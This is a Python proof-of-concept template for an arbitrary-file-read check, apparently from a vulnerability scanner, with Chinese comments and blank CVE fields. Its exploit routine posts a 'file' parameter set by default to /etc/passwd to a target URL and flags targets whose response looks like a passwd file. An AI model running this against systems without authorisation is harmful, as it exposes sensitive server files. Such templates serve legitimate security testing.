#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import subprocess
import sys
import importlib
from collections import OrderedDict

class DemoPOC:
    appName = ''              # 漏洞影响的应用或组件名称
    appVersion = ''           # 漏洞影响版本
    install_requires = []     # 你可以在这里添加其他需要的库
    CVE_ID = ""               # CVE编号
    Vul_name = "Arbitrary File Read"  # 漏洞名称
    Type = "Arbitrary File Read"        # 漏洞类型
    Description = ""          # 漏洞描述
    Script_type = "python"    # POC类型（暂时只支持python）
    Script = "file_read_poc.py" # POC文件名（包含后缀）
    Vul_Date = ""             # 漏洞公开日期

    def __init__(self, url, ip, port):
        self.url = url
        self.ip = ip
        self.port = port
        self.options = self._options()

    def check_and_install_dependencies(self):
        """检查并安装所需的库"""
        missing_packages = []
        for package in self.install_requires:
            try:
                importlib.import_module(package)
            except ImportError:
                missing_packages.append(package)

        if missing_packages:
            print(f"Missing packages: {missing_packages}. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", *missing_packages])
                print(f"Successfully installed: {missing_packages}")
            except subprocess.CalledProcessError as e:
                print(f"[ERROR] Failed to install required packages: {e}")
                return False
        return True

    def _options(self):
        """定义POC运行时所需的选项"""
        o = OrderedDict()
        o['user'] = ''  # 支持认证的账号
        o['pwd'] = ''   # 支持认证的密码
        o['filepath'] = '/etc/passwd'  # 要读取的文件路径，默认是 /etc/passwd
        return o

    def get_option(self, key):
        """从options中获取选项值"""
        if key in self.options:
            return self.options[key]  # 返回选项的值
        else:
            raise KeyError(f"Option '{key}' not found in available options.")

    def _exploit(self, param=''):
        """模拟漏洞利用，发送请求读取文件"""
        user = self.get_option('user')
        pwd = self.get_option('pwd')
        filepath = self.get_option('filepath')

        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = {'file': filepath}  # 使用文件路径作为请求参数

        result = {}
        try:
            res = requests.post(self.url, headers=headers, data=payload, auth=(user, pwd))  # 认证请求
            result['ExploitResponse'] = res.text
            return res.text
        except requests.RequestException as e:
            result['Error'] = f"[ERROR] Request failed: {e}"  # 错误信息
            return result

    def _verify(self):
        """验证漏洞是否存在"""
        self.check_and_install_dependencies()  # 检查所需库
        result = {}
        try:
            # 调用 _exploit 并获取返回结果
            res = self._exploit()

            # 如果请求返回有效内容并包含文件标志，认为漏洞存在
            if isinstance(res, dict) and 'Error' in res:
                result.update(res)  # 传递 _exploit 中的错误信息
            elif res and ':/bin/' in res:  # 检查文件读取是否包含 Linux /etc/passwd 的标志
                result['VerifyInfo'] = f"[!] Vulnerability found at {self.url}, able to read file: {self.get_option('filepath')}"
            else:
                result['VerifyInfo'] = "[SAFE] No vulnerability found."
        except Exception as e:
            result['Error'] = f"[ERROR] Error during POC execution: {str(e)}"
        return result

